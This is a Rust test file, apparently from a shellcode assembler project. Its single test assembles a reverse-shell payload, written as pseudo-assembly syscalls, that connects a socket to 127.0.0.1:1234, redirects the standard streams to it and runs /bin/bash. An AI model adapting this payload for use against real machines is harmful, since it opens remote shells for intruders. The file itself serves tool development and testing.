mod lexer;
mod compiler;

#[cfg(test)]
mod test {
    use super::*;

    #[test]
    fn test_parse() {
        let asm = "\
        R9 = SYSCALL SOCKET 2 1 6\n\
        SYSCALL CONNECT R9 sockaddr_in{127.0.0.1,1234,2} 16\n\
        SYSCALL DUP2 R9 0\n\
        SYSCALL DUP2 R9 1\n\
        SYSCALL DUP2 R9 2\n\
        SYSCALL EXECVE \"/bin/bash\" 0 0\n\
        SYSCALL EXIT 0\
        ";

        let mut shellcode= Vec::new();

        for line in asm.lines().into_iter() {
            let tokens = Box::new(lexer::parse_line(line.split_whitespace().collect()));

            if let Ok(mut instructions) = compiler::assemble_assignation(tokens.clone()) {
                shellcode.append(&mut instructions);
            } else if let Ok(mut instructions) = compiler::assemble_syscall(tokens) {
                shellcode.append(&mut instructions);
            } else {
                println!("Unknow line: {}", line);
            }
        }

        for line in shellcode {
            println!("{} {}", line.mnemonic, line.operands.join(", "));
        }
    }
}
